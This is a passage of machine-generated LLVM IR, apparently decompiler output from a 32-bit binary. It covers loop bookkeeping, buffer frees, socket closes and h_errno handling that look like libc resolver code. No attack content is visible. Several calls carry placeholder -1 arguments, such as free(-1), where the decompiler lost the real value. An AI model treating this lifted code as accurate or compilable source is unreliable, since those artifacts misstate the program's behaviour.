dec_label_pc_8056c9d:                             ; preds = %dec_label_pc_8056c8d
  %v0_8056c9d = load i32, i32* @edx, align 4
  %v2_8056c9d = add i32 %v0_8056c7d, 12
  %v3_8056c9d = inttoptr i32 %v2_8056c9d to i32*
  store i32 %v0_8056c9d, i32* %v3_8056c9d, align 4
  %v0_8056c9e = load i32, i32* %eax.global-to-local, align 4
  %v2_8056c9e = add i32 %v0_8056c7d, 8
  %v3_8056c9e = inttoptr i32 %v2_8056c9e to i32*
  store i32 %v0_8056c9e, i32* %v3_8056c9e, align 4
  %v1_8056c9f = add i32 %v0_8056c7d, 152
  %v2_8056c9f = inttoptr i32 %v1_8056c9f to i32*
  %v3_8056c9f = load i32, i32* %v2_8056c9f, align 4
  %v5_8056c9f = add i32 %v0_8056c7d, 4
  %v6_8056c9f = inttoptr i32 %v5_8056c9f to i32*
  store i32 %v3_8056c9f, i32* %v6_8056c9f, align 4
  %v0_8056ca6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056ca6 = load i32, i32* @edi, align 4
  %v2_8056ca6 = add i32 %v1_8056ca6, 36
  %v3_8056ca6 = inttoptr i32 %v2_8056ca6 to i32*
  %v4_8056ca6 = load i32, i32* %v3_8056ca6, align 4
  %v7_8056ca6 = mul i32 %v4_8056ca6, %v0_8056ca6
  store i32 %v7_8056ca6, i32* %eax.global-to-local, align 4
  %v2_8056caa = add i32 %v1_8056ca6, 28
  %v3_8056caa = inttoptr i32 %v2_8056caa to i32*
  %v4_8056caa = load i32, i32* %v3_8056caa, align 4
  %v5_8056caa = add i32 %v4_8056caa, %v7_8056ca6
  store i32 %v5_8056caa, i32* %eax.global-to-local, align 4
  %v3_8056cad = inttoptr i32 %v0_8056c7d to i32*
  store i32 %v5_8056caa, i32* %v3_8056cad, align 4
  %v4_8056cae = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056cae, i32* %eax.global-to-local, align 4
  %v0_8056cb3 = load i32, i32* @edi, align 4
  %v1_8056cb3 = add i32 %v0_8056cb3, 36
  %v2_8056cb3 = inttoptr i32 %v1_8056cb3 to i32*
  %v3_8056cb3 = load i32, i32* %v2_8056cb3, align 4
  %v4_8056cb3 = add i32 %v3_8056cb3, 1
  store i32 %v4_8056cb3, i32* %v2_8056cb3, align 4
  br label %dec_label_pc_8056cb6

dec_label_pc_8056cb6:                             ; preds = %dec_label_pc_8056c3a, %dec_label_pc_8056c9d
  %v0_8056cb6 = load i32, i32* @esp, align 4
  %v1_8056cb6 = add i32 %v0_8056cb6, 16
  br label %dec_label_pc_8056cb9

dec_label_pc_8056cb9:                             ; preds = %dec_label_pc_8056c6e, %dec_label_pc_8056c60, %dec_label_pc_8056cb6
  %v1_8056cb9 = phi i32 [ %v1_8056c7d, %dec_label_pc_8056c6e ], [ %v1_8056cb9.pre, %dec_label_pc_8056c60 ], [ %v1_8056cb6, %dec_label_pc_8056cb6 ]
  %v0_8056cb9 = load i32, i32* @esi, align 4
  %v2_8056cb9 = add i32 %v1_8056cb9, 52
  %v3_8056cb9 = inttoptr i32 %v2_8056cb9 to i32*
  %v4_8056cb9 = load i32, i32* %v3_8056cb9, align 4
  %v5_8056cb9 = add i32 %v4_8056cb9, %v0_8056cb9
  store i32 %v5_8056cb9, i32* @esi, align 4
  %v0_8056cbd = load i32, i32* @ebx, align 4
  %v1_8056cbd = add i32 %v0_8056cbd, 1
  store i32 %v1_8056cbd, i32* @ebx, align 4
  %v2_8056cbe = add i32 %v1_8056cb9, 104
  %v3_8056cbe = inttoptr i32 %v2_8056cbe to i32*
  %v4_8056cbe = load i32, i32* %v3_8056cbe, align 4
  %v5_8056cbe = sub i32 %v1_8056cbd, %v4_8056cbe
  %v11_8056cbe = xor i32 %v4_8056cbe, %v1_8056cbd
  %v12_8056cbe = xor i32 %v5_8056cbe, %v1_8056cbd
  %v13_8056cbe = and i32 %v12_8056cbe, %v11_8056cbe
  %v14_8056cbe = icmp slt i32 %v13_8056cbe, 0
  %v16_8056cbe = icmp slt i32 %v5_8056cbe, 0
  %v2_8056cc2 = icmp eq i1 %v16_8056cbe, %v14_8056cbe
  br i1 %v2_8056cc2, label %dec_label_pc_8056cce, label %dec_label_pc_8056cc4

dec_label_pc_8056cc4:                             ; preds = %dec_label_pc_8056cc4.lr.ph, %dec_label_pc_8056cb9
  %v0_8056cc4 = phi i32 [ %v0_8056cc4.pre, %dec_label_pc_8056cc4.lr.ph ], [ %v5_8056cb9, %dec_label_pc_8056cb9 ]
  %v0_8056b9a67 = phi i32 [ %v1_8056cbe.pre, %dec_label_pc_8056cc4.lr.ph ], [ %v1_8056cb9, %dec_label_pc_8056cb9 ]
  %v2_8056cc4 = add i32 %v0_8056b9a67, 16
  %v3_8056cc4 = inttoptr i32 %v2_8056cc4 to i32*
  %v4_8056cc4 = load i32, i32* %v3_8056cc4, align 4
  %v5_8056cc4 = sub i32 %v0_8056cc4, %v4_8056cc4
  %v11_8056cc4 = xor i32 %v4_8056cc4, %v0_8056cc4
  %v12_8056cc4 = xor i32 %v5_8056cc4, %v0_8056cc4
  %v13_8056cc4 = and i32 %v12_8056cc4, %v11_8056cc4
  %v14_8056cc4 = icmp slt i32 %v13_8056cc4, 0
  %v16_8056cc4 = icmp slt i32 %v5_8056cc4, 0
  %v2_8056cc8 = icmp eq i1 %v16_8056cc4, %v14_8056cc4
  br i1 %v2_8056cc8, label %dec_label_pc_8056cce, label %dec_label_pc_8056b9a

dec_label_pc_8056cce:                             ; preds = %dec_label_pc_8056bbd, %dec_label_pc_8056b8e, %dec_label_pc_8056cb9, %dec_label_pc_8056c0f, %dec_label_pc_8056c23, %dec_label_pc_8056cc4, %dec_label_pc_8056c46.dec_label_pc_8056cce.loopexit_crit_edge
  %v0_8056cce = phi i32 [ %v0_8056cce.pre.pre, %dec_label_pc_8056c46.dec_label_pc_8056cce.loopexit_crit_edge ], [ %v1_8056cbe.pre, %dec_label_pc_8056b8e ], [ %v1_8056cb9, %dec_label_pc_8056cb9 ], [ %v1_8056c07, %dec_label_pc_8056c0f ], [ %v1_8056c07, %dec_label_pc_8056c23 ], [ %v0_8056b9a67, %dec_label_pc_8056cc4 ], [ %v1_8056bae, %dec_label_pc_8056bbd ]
  %v1_8056cd1 = add i32 %v0_8056cce, 20
  %v2_8056cd1 = inttoptr i32 %v1_8056cd1 to i32*
  %v3_8056cd1 = load i32, i32* %v2_8056cd1, align 4
  %v5_8056cd1 = add i32 %v0_8056cce, -16
  %v6_8056cd1 = inttoptr i32 %v5_8056cd1 to i32*
  store i32 %v3_8056cd1, i32* %v6_8056cd1, align 4
  %v1_8056cd5 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8056cd5, i32* %eax.global-to-local, align 4
  %v0_8056cda = load i32, i32* @esp, align 4
  %v1_8056cdd = add i32 %v0_8056cda, 272
  %v2_8056cdd = inttoptr i32 %v1_8056cdd to i32*
  %v3_8056cdd = load i32, i32* %v2_8056cdd, align 4
  %v4_8056cdd = icmp eq i32 %v3_8056cdd, 0
  br i1 %v4_8056cdd, label %dec_label_pc_8056cf2, label %dec_label_pc_8056ce7

dec_label_pc_8056ce7:                             ; preds = %dec_label_pc_8056cce
  store i32 %v3_8056cdd, i32* %edx.global-to-local, align 4
  %v2_8056cee = inttoptr i32 %v3_8056cdd to i32*
  store i32 %v2_805675e, i32* %v2_8056cee, align 4
  %v0_8056cfe.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056cfe

dec_label_pc_8056cf2:                             ; preds = %dec_label_pc_8056cce
  %v3_8056cf5 = inttoptr i32 %v0_8056cda to i32*
  store i32 %v2_805675e, i32* %v3_8056cf5, align 4
  %v1_8056cf6 = call i32 @free(i32 -1)
  store i32 %v1_8056cf6, i32* %eax.global-to-local, align 4
  %v0_8056cfb = load i32, i32* @esp, align 4
  %v1_8056cfb = add i32 %v0_8056cfb, 16
  br label %dec_label_pc_8056cfe

dec_label_pc_8056cfe:                             ; preds = %dec_label_pc_8056ce7, %dec_label_pc_8056cf2
  %v0_8056cfe = phi i32 [ %v0_8056cfe.pre, %dec_label_pc_8056ce7 ], [ %v1_8056cfb, %dec_label_pc_8056cf2 ]
  %v1_8056d01 = add i32 %v0_8056cfe, 12
  %v2_8056d01 = inttoptr i32 %v1_8056d01 to i32*
  %v3_8056d01 = load i32, i32* %v2_8056d01, align 4
  %v5_8056d01 = add i32 %v0_8056cfe, -16
  %v6_8056d01 = inttoptr i32 %v5_8056d01 to i32*
  store i32 %v3_8056d01, i32* %v6_8056d01, align 4
  %v1_8056d05 = call i32 @free(i32 -1)
  store i32 %v1_8056d05, i32* @eax, align 4
  %v0_8056d0a = load i32, i32* @esp, align 4
  %v1_8056d0d = add i32 %v0_8056d0a, 8
  %v2_8056d0d = inttoptr i32 %v1_8056d0d to i32*
  store i32 ptrtoint (i8** @global_var_8065748.1015 to i32), i32* %v2_8056d0d, align 4
  %v1_8056d12 = add i32 %v0_8056d0a, 4
  %v2_8056d12 = inttoptr i32 %v1_8056d12 to i32*
  store i32 134567199, i32* %v2_8056d12, align 4
  %v1_8056d17 = add i32 %v0_8056d0a, 200
  store i32 %v1_8056d17, i32* %ebx.global-to-local, align 4
  %v3_8056d1e = inttoptr i32 %v0_8056d0a to i32*
  store i32 %v1_8056d17, i32* %v3_8056d1e, align 4
  %v2_8056d1f = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_8056d1f, i32* %eax.global-to-local, align 4
  %v0_8056d24 = load i32, i32* @esp, align 4
  %v1_8056d24 = inttoptr i32 %v0_8056d24 to i32*
  store i32 ptrtoint (i8** @global_var_8065748.1015 to i32), i32* %v1_8056d24, align 4
  %v1_8056d2b = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056d2b, i32* %eax.global-to-local, align 4
  %v0_8056d30 = load i32, i32* @esp, align 4
  %v1_8056d30 = add i32 %v0_8056d30, 56
  %v2_8056d30 = inttoptr i32 %v1_8056d30 to i32*
  %v3_8056d30 = load i32, i32* %v2_8056d30, align 4
  store i32 %v3_8056d30, i32* @eax, align 4
  %v1_8056d34 = add i32 %v0_8056d30, 60
  %v2_8056d34 = inttoptr i32 %v1_8056d34 to i32*
  %v3_8056d34 = load i32, i32* %v2_8056d34, align 4
  store i32 %v3_8056d34, i32* %edx.global-to-local, align 4
  %v1_8056d38 = inttoptr i32 %v0_8056d30 to i32*
  %v3_8056d38 = add i32 %v0_8056d30, 4
  %v1_8056d39 = inttoptr i32 %v3_8056d38 to i32*
  %v1_8056d3a = sext i32 %v3_8056d30 to i64
  store i64 %v1_8056d3a, i64* @global_var_8065760.1016, align 32
  %v1_8056d3f = trunc i32 %v3_8056d34 to i16
  store i16 %v1_8056d3f, i16* @global_var_805f4a4.1017, align 4
  store i32 1, i32* %v1_8056d39, align 4
  %v0_8056d48 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056d48, i32* %v1_8056d38, align 4
  %v2_8056d49 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_8056d49, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056e8a

dec_label_pc_8056d53:                             ; preds = %dec_label_pc_8056c8d
  %v1_8056d56 = inttoptr i32 %v0_8056c8d to i32*
  %v2_8056d56 = load i32, i32* %v1_8056d56, align 4
  %v5_8056d56 = inttoptr i32 %v0_8056c7d to i32*
  store i32 %v2_8056d56, i32* %v5_8056d56, align 4
  %v1_8056d58 = call i32 @free(i32 -1)
  store i32 %v1_8056d58, i32* @eax, align 4
  %v0_8056d5d = load i32, i32* @esp, align 4
  %v1_8056d5d = add i32 %v0_8056d5d, 16
  br label %dec_label_pc_8056d60

dec_label_pc_8056d60:                             ; preds = %dec_label_pc_8056a92, %dec_label_pc_8056bbd, %dec_label_pc_8056bb5, %dec_label_pc_8056b51, %dec_label_pc_8056ad7, %dec_label_pc_8056ab3, %dec_label_pc_8056d53
  %v1_8056d67 = phi i32 [ %v1_8056aa7, %dec_label_pc_8056a92 ], [ %v1_8056bae, %dec_label_pc_8056bbd ], [ %v1_8056bae, %dec_label_pc_8056bb5 ], [ %v1_8056ac8, %dec_label_pc_8056b51 ], [ %v1_8056ac8, %dec_label_pc_8056ad7 ], [ %v1_8056ac8, %dec_label_pc_8056ab3 ], [ %v1_8056d5d, %dec_label_pc_8056d53 ]
  %v1_8056d60 = add i32 %v1_8056d67, 51
  %v2_8056d60 = inttoptr i32 %v1_8056d60 to i8*
  %v3_8056d60 = load i8, i8* %v2_8056d60, align 1
  %v4_8056d60 = icmp eq i8 %v3_8056d60, 0
  %v1_8056d65 = icmp eq i1 %v4_8056d60, false
  br i1 %v1_8056d65, label %dec_label_pc_8056dab, label %dec_label_pc_8056d67

dec_label_pc_8056d67:                             ; preds = %dec_label_pc_8056d60
  %v0_8056d67 = load i32, i32* @ecx, align 4
  %v2_8056d67 = add i32 %v1_8056d67, -4
  %v3_8056d67 = inttoptr i32 %v2_8056d67 to i32*
  store i32 %v0_8056d67, i32* %v3_8056d67, align 4
  %v1_8056d68 = add i32 %v1_8056d67, -8
  %v2_8056d68 = inttoptr i32 %v1_8056d68 to i32*
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* %v2_8056d68, align 4
  %v1_8056d6d = add i32 %v1_8056d67, -12
  %v2_8056d6d = inttoptr i32 %v1_8056d6d to i32*
  store i32 134567199, i32* %v2_8056d6d, align 4
  %v1_8056d72 = add i32 %v1_8056d67, 184
  store i32 %v1_8056d72, i32* @esi, align 4
  %v2_8056d79 = add i32 %v1_8056d67, -16
  %v3_8056d79 = inttoptr i32 %v2_8056d79 to i32*
  store i32 %v1_8056d72, i32* %v3_8056d79, align 4
  %v2_8056d7a = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_8056d7a, i32* %eax.global-to-local, align 4
  %v0_8056d7f = load i32, i32* @esp, align 4
  %v1_8056d7f = inttoptr i32 %v0_8056d7f to i32*
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* %v1_8056d7f, align 4
  %v1_8056d86 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056d86, i32* %eax.global-to-local, align 4
  %v0_8056d8b = load i32, i32* @global_var_8065b98.1018, align 8
  store i32 %v0_8056d8b, i32* %ebx.global-to-local, align 4
  %v0_8056d91 = load i32, i32* @esp, align 4
  %v1_8056d91 = inttoptr i32 %v0_8056d91 to i32*
  %v2_8056d91 = load i32, i32* %v1_8056d91, align 4
  store i32 %v2_8056d91, i32* @eax, align 4
  %v3_8056d91 = add i32 %v0_8056d91, 4
  %v1_8056d92 = inttoptr i32 %v3_8056d91 to i32*
  %v2_8056d92 = load i32, i32* %v1_8056d92, align 4
  store i32 %v2_8056d92, i32* %edx.global-to-local, align 4
  %v1_8056d93 = add i32 %v0_8056d8b, -1
  store i32 %v1_8056d93, i32* @ebx, align 4
  store i32 1, i32* %v1_8056d92, align 4
  %v0_8056d96 = load i32, i32* @esi, align 4
  store i32 %v0_8056d96, i32* %v1_8056d91, align 4
  %v2_8056d97 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_8056d97, i32* %eax.global-to-local, align 4
  %v0_8056d9c = load i32, i32* @esp, align 4
  %v1_8056d9c = add i32 %v0_8056d9c, 16
  %v1_8056d9f = add i32 %v0_8056d9c, 52
  %v2_8056d9f = inttoptr i32 %v1_8056d9f to i32*
  %v3_8056d9f = load i32, i32* %v2_8056d9f, align 4
  %v4_8056d9f = load i32, i32* @ebx, align 4
  %v5_8056d9f = sub i32 %v3_8056d9f, %v4_8056d9f
  %v11_8056d9f = xor i32 %v4_8056d9f, %v3_8056d9f
  %v12_8056d9f = xor i32 %v5_8056d9f, %v3_8056d9f
  %v13_8056d9f = and i32 %v12_8056d9f, %v11_8056d9f
  %v14_8056d9f = icmp slt i32 %v13_8056d9f, 0
  %v16_8056d9f = icmp slt i32 %v5_8056d9f, 0
  %v2_8056da3 = icmp eq i1 %v16_8056d9f, %v14_8056d9f
  br i1 %v2_8056da3, label %dec_label_pc_8056dab, label %dec_label_pc_8056da5

dec_label_pc_8056da5:                             ; preds = %dec_label_pc_8056d67
  %v4_8056da5 = add i32 %v3_8056d9f, 1
  store i32 %v4_8056da5, i32* %v2_8056d9f, align 4
  br label %dec_label_pc_8056dcc.backedge

dec_label_pc_8056dab:                             ; preds = %dec_label_pc_8056a34, %dec_label_pc_8056d67, %dec_label_pc_8056d60, %dec_label_pc_8056a4b
  %v1_8056dba = phi i32 [ %v1_8056d9c, %dec_label_pc_8056d67 ], [ %v1_8056d67, %dec_label_pc_8056d60 ], [ %v1_8056a87, %dec_label_pc_8056a4b ], [ %v0_8056dab.pre, %dec_label_pc_8056a34 ]
  %v1_8056dab = add i32 %v1_8056dba, 40
  %v2_8056dab = inttoptr i32 %v1_8056dab to i32*
  %v3_8056dab = load i32, i32* %v2_8056dab, align 4
  %v1_8056daf = add i32 %v3_8056dab, 1
  store i32 %v1_8056daf, i32* %eax.global-to-local, align 4
  %v1_8056db0 = ashr i32 %v1_8056daf, 31
  store i32 %v1_8056db0, i32* %edx.global-to-local, align 4
  %v1_8056db1 = add i32 %v1_8056dba, 248
  %v2_8056db1 = inttoptr i32 %v1_8056db1 to i32*
  %v3_8056db1 = load i32, i32* %v2_8056db1, align 4
  %v5_8056db1 = zext i32 %v1_8056daf to i64
  %v7_8056db1 = zext i32 %v1_8056db0 to i64
  %v8_8056db1 = mul nuw i64 %v7_8056db1, 4294967296
  %v9_8056db1 = or i64 %v8_8056db1, %v5_8056db1
  %v10_8056db1 = zext i32 %v3_8056db1 to i64
  %v11_8056db1 = sdiv i64 %v9_8056db1, %v10_8056db1
  %v12_8056db1 = trunc i64 %v11_8056db1 to i32
  store i32 %v12_8056db1, i32* %eax.global-to-local, align 4
  %v13_8056db1 = srem i64 %v9_8056db1, %v10_8056db1
  %v14_8056db1 = trunc i64 %v13_8056db1 to i32
  store i32 %v14_8056db1, i32* %edx.global-to-local, align 4
  %v1_8056db8 = icmp eq i32 %v14_8056db1, 0
  store i32 %v14_8056db1, i32* %v2_8056dab, align 4
  %v1_8056dbe = icmp eq i1 %v1_8056db8, false
  br i1 %v1_8056dbe, label %dec_label_pc_8056dc4, label %dec_label_pc_8056dc0

dec_label_pc_8056dc0:                             ; preds = %dec_label_pc_8056dab
  %v0_8056dc0 = load i32, i32* @esp, align 4
  %v1_8056dc0 = add i32 %v0_8056dc0, 28
  %v2_8056dc0 = inttoptr i32 %v1_8056dc0 to i32*
  %v3_8056dc0 = load i32, i32* %v2_8056dc0, align 4
  %v4_8056dc0 = add i32 %v3_8056dc0, 1
  store i32 %v4_8056dc0, i32* %v2_8056dc0, align 4
  br label %dec_label_pc_8056dc4

dec_label_pc_8056dc4:                             ; preds = %dec_label_pc_8056dab, %dec_label_pc_8056dc0
  %v0_8056dc4 = load i32, i32* @esp, align 4
  %v1_8056dc4 = add i32 %v0_8056dc4, 36
  %v2_8056dc4 = inttoptr i32 %v1_8056dc4 to i32*
  store i32 -1, i32* %v2_8056dc4, align 4
  br label %dec_label_pc_8056dcc.backedge

dec_label_pc_8056dcc.backedge:                    ; preds = %dec_label_pc_8056dc4, %dec_label_pc_8056a42, %dec_label_pc_8056b30, %dec_label_pc_8056da5
  %v0_8056dcc.pre = load i32, i32* @esp, align 4
  %v1_8056dcc = add i32 %v0_8056dcc.pre, 28
  %v2_8056dcc = inttoptr i32 %v1_8056dcc to i32*
  %v3_8056dcc = load i32, i32* %v2_8056dcc, align 4
  %tmp110 = icmp ult i32 %v3_8056dcc, 3
  br i1 %tmp110, label %dec_label_pc_805682c, label %dec_label_pc_8056df1

dec_label_pc_8056df1:                             ; preds = %dec_label_pc_80567a6, %dec_label_pc_8056842, %dec_label_pc_8056936, %dec_label_pc_8056dcc.backedge, %entry, %dec_label_pc_8056780, %dec_label_pc_8056788, %dec_label_pc_8056796
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8056796 ], [ -1, %dec_label_pc_8056788 ], [ -1, %dec_label_pc_8056780 ], [ -1, %entry ], [ %v0_80567f3, %dec_label_pc_8056dcc.backedge ], [ %v0_80567f3, %dec_label_pc_8056936 ], [ %v0_80567f3, %dec_label_pc_8056842 ], [ %v0_80567f3, %dec_label_pc_80567a6 ]
  %v0_8056df1 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056df1, i32* %eax.global-to-local, align 4
  %v1_8056df6 = inttoptr i32 %v0_8056df1 to i32*
  store i32 -1, i32* %v1_8056df6, align 4
  %v0_8056dfc = load i32, i32* @esp, align 4
  %v1_8056dfc = add i32 %v0_8056dfc, 56
  %v2_8056dfc = inttoptr i32 %v1_8056dfc to i32*
  %v3_8056dfc = load i32, i32* %v2_8056dfc, align 4
  store i32 %v3_8056dfc, i32* %eax.global-to-local, align 4
  %v2_8056e00 = add i32 %v0_8056dfc, 44
  %v3_8056e00 = inttoptr i32 %v2_8056e00 to i32*
  store i32 %v3_8056dfc, i32* %v3_8056e00, align 4
  br label %dec_label_pc_8056e04

dec_label_pc_8056e04:                             ; preds = %dec_label_pc_8056b69, %dec_label_pc_8056b41, %dec_label_pc_8056df1
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8056df1 ], [ %v0_80567f3, %dec_label_pc_8056b69 ], [ %v0_80567f3, %dec_label_pc_8056b41 ]
  %v0_8056e04 = load i32, i32* @esp, align 4
  %v1_8056e04 = add i32 %v0_8056e04, 20
  %v2_8056e04 = inttoptr i32 %v1_8056e04 to i32*
  %v3_8056e04 = load i32, i32* %v2_8056e04, align 4
  %v13_8056e04 = icmp eq i32 %v3_8056e04, -1
  br i1 %v13_8056e04, label %dec_label_pc_8056e04.dec_label_pc_8056e1a_crit_edge, label %dec_label_pc_8056e0b

dec_label_pc_8056e04.dec_label_pc_8056e1a_crit_edge: ; preds = %dec_label_pc_8056e04
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_8056e1a

dec_label_pc_8056e0b:                             ; preds = %dec_label_pc_8056e04
  %v3_8056e0e = load i32, i32* %v2_8056e04, align 4
  %v5_8056e0e = add i32 %v0_8056e04, -16
  %v6_8056e0e = inttoptr i32 %v5_8056e0e to i32*
  store i32 %v3_8056e0e, i32* %v6_8056e0e, align 4
  %v1_8056e12 = sext i16 %stack_var_-180.1 to i32
  %v2_8056e12 = call i32 @__libc_close(i32 %v1_8056e12)
  store i32 %v2_8056e12, i32* %eax.global-to-local, align 4
  %v0_8056e17 = load i32, i32* @esp, align 4
  %v1_8056e17 = add i32 %v0_8056e17, 16
  br label %dec_label_pc_8056e1a

dec_label_pc_8056e1a:                             ; preds = %dec_label_pc_8056e04.dec_label_pc_8056e1a_crit_edge, %dec_label_pc_8056e0b
  %v1_8056e21.pre-phi = phi i32 [ %.pre, %dec_label_pc_8056e04.dec_label_pc_8056e1a_crit_edge ], [ %v1_8056e12, %dec_label_pc_8056e0b ]
  %v0_8056e1a = phi i32 [ %v0_8056e04, %dec_label_pc_8056e04.dec_label_pc_8056e1a_crit_edge ], [ %v1_8056e17, %dec_label_pc_8056e0b ]
  %v1_8056e1d = add i32 %v0_8056e1a, 12
  %v2_8056e1d = inttoptr i32 %v1_8056e1d to i32*
  %v3_8056e1d = load i32, i32* %v2_8056e1d, align 4
  %v5_8056e1d = add i32 %v0_8056e1a, -16
  %v6_8056e1d = inttoptr i32 %v5_8056e1d to i32*
  store i32 %v3_8056e1d, i32* %v6_8056e1d, align 4
  %v2_8056e21 = call i32 @free(i32 %v1_8056e21.pre-phi)
  store i32 %v2_8056e21, i32* %eax.global-to-local, align 4
  %v1_8056e26 = load i32, i32* @esp, align 4
  %v2_8056e26 = inttoptr i32 %v1_8056e26 to i32*
  store i32 %v2_805675e, i32* %v2_8056e26, align 4
  %v2_8056e29 = call i32 @free(i32 %v1_8056e21.pre-phi)
  store i32 %v2_8056e29, i32* @eax, align 4
  %v0_8056e2e = load i32, i32* @esp, align 4
  %v1_8056e31 = add i32 %v0_8056e2e, 56
  %v2_8056e31 = inttoptr i32 %v1_8056e31 to i32*
  %v3_8056e31 = load i32, i32* %v2_8056e31, align 4
  %v13_8056e31 = icmp eq i32 %v3_8056e31, -1
  %v1_8056e36 = add i32 %v0_8056e2e, 32
  %v2_8056e36 = inttoptr i32 %v1_8056e36 to i32*
  store i32 -1, i32* %v2_8056e36, align 4
  br i1 %v13_8056e31, label %dec_label_pc_8056e1a.dec_label_pc_8056e8d_crit_edge, label %dec_label_pc_8056e40

dec_label_pc_8056e1a.dec_label_pc_8056e8d_crit_edge: ; preds = %dec_label_pc_8056e1a
  %v0_8056e8d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056e8d

dec_label_pc_8056e40:                             ; preds = %dec_label_pc_8056e1a
  %v0_8056e40 = load i32, i32* @ecx, align 4
  %v1_8056e40 = load i32, i32* @esp, align 4
  %v2_8056e40 = add i32 %v1_8056e40, -4
  %v3_8056e40 = inttoptr i32 %v2_8056e40 to i32*
  store i32 %v0_8056e40, i32* %v3_8056e40, align 4
  %v1_8056e41 = add i32 %v1_8056e40, -8
  %v2_8056e41 = inttoptr i32 %v1_8056e41 to i32*
  store i32 ptrtoint (i8** @global_var_8065748.1015 to i32), i32* %v2_8056e41, align 4
  %v1_8056e46 = add i32 %v1_8056e40, -12
  %v2_8056e46 = inttoptr i32 %v1_8056e46 to i32*
  store i32 134567199, i32* %v2_8056e46, align 4
  %v1_8056e4b = add i32 %v1_8056e40, 184
  store i32 %v1_8056e4b, i32* %ebx.global-to-local, align 4
  %v2_8056e52 = add i32 %v1_8056e40, -16
  %v3_8056e52 = inttoptr i32 %v2_8056e52 to i32*
  store i32 %v1_8056e4b, i32* %v3_8056e52, align 4
  %v3_8056e53 = call i32 @__pthread_return_void(i32 %v1_8056e21.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056e53, i32* %eax.global-to-local, align 4
  %v0_8056e58 = load i32, i32* @esp, align 4
  %v1_8056e58 = inttoptr i32 %v0_8056e58 to i32*
  store i32 ptrtoint (i8** @global_var_8065748.1015 to i32), i32* %v1_8056e58, align 4
  %v2_8056e5f = call i32 @__pthread_return_0(i32 %v1_8056e21.pre-phi)
  store i32 %v2_8056e5f, i32* %eax.global-to-local, align 4
  %v0_8056e64 = load i32, i32* @esp, align 4
  %v1_8056e64 = add i32 %v0_8056e64, 60
  %v2_8056e64 = inttoptr i32 %v1_8056e64 to i32*
  %v3_8056e64 = load i32, i32* %v2_8056e64, align 4
  store i32 %v3_8056e64, i32* %eax.global-to-local, align 4
  %v1_8056e68 = add i32 %v0_8056e64, 56
  %v2_8056e68 = inttoptr i32 %v1_8056e68 to i32*
  %v3_8056e68 = load i32, i32* %v2_8056e68, align 4
  store i32 %v3_8056e68, i32* %edx.global-to-local, align 4
  %v1_8056e6c = trunc i32 %v3_8056e64 to i16
  store i16 %v1_8056e6c, i16* @global_var_805f4a4.1017, align 4
  %v1_8056e72 = inttoptr i32 %v0_8056e64 to i32*
  %v2_8056e72 = load i32, i32* %v1_8056e72, align 4
  store i32 %v2_8056e72, i32* @eax, align 4
  %v3_8056e72 = add i32 %v0_8056e64, 4
  %v1_8056e73 = sext i32 %v3_8056e68 to i64
  store i64 %v1_8056e73, i64* @global_var_8065760.1016, align 32
  %v1_8056e79 = inttoptr i32 %v3_8056e72 to i32*
  %v2_8056e79 = load i32, i32* %v1_8056e79, align 4
  store i32 %v2_8056e79, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8056e79, align 4
  %v0_8056e7c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056e7c, i32* %v1_8056e72, align 4
  %v3_8056e7d = call i32 @__pthread_return_void(i32 %v1_8056e21.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056e7d, i32* %eax.global-to-local, align 4
  %v0_8056e82 = load i32, i32* @esp, align 4
  %v1_8056e82 = add i32 %v0_8056e82, 32
  %v2_8056e82 = inttoptr i32 %v1_8056e82 to i32*
  store i32 -1, i32* %v2_8056e82, align 4
  br label %dec_label_pc_8056e8a

dec_label_pc_8056e8a:                             ; preds = %dec_label_pc_8056cfe, %dec_label_pc_8056e40
  %v0_8056e8a = load i32, i32* @esp, align 4
  %v1_8056e8a = add i32 %v0_8056e8a, 16
  br label %dec_label_pc_8056e8d

dec_label_pc_8056e8d:                             ; preds = %dec_label_pc_8056e1a.dec_label_pc_8056e8d_crit_edge, %dec_label_pc_8056e8a
  %v0_8056e8d = phi i32 [ %v0_8056e8d.pre, %dec_label_pc_8056e1a.dec_label_pc_8056e8d_crit_edge ], [ %v1_8056e8a, %dec_label_pc_8056e8a ]
  %v1_8056e8d = add i32 %v0_8056e8d, 16
  %v2_8056e8d = inttoptr i32 %v1_8056e8d to i32*
  %v3_8056e8d = load i32, i32* %v2_8056e8d, align 4
  store i32 %v3_8056e8d, i32* %eax.global-to-local, align 4
  %v1_8056e91 = add i32 %v0_8056e8d, 220
  %v1_8056e97 = inttoptr i32 %v1_8056e91 to i32*
  %v2_8056e97 = load i32, i32* %v1_8056e97, align 4
  store i32 %v2_8056e97, i32* @ebx, align 4
  %v3_8056e97 = add i32 %v0_8056e8d, 224
  %v1_8056e98 = inttoptr i32 %v3_8056e97 to i32*
  %v2_8056e98 = load i32, i32* %v1_8056e98, align 4
  store i32 %v2_8056e98, i32* @esi, align 4
  %v3_8056e98 = add i32 %v0_8056e8d, 228
  %v1_8056e99 = inttoptr i32 %v3_8056e98 to i32*
  %v2_8056e99 = load i32, i32* %v1_8056e99, align 4
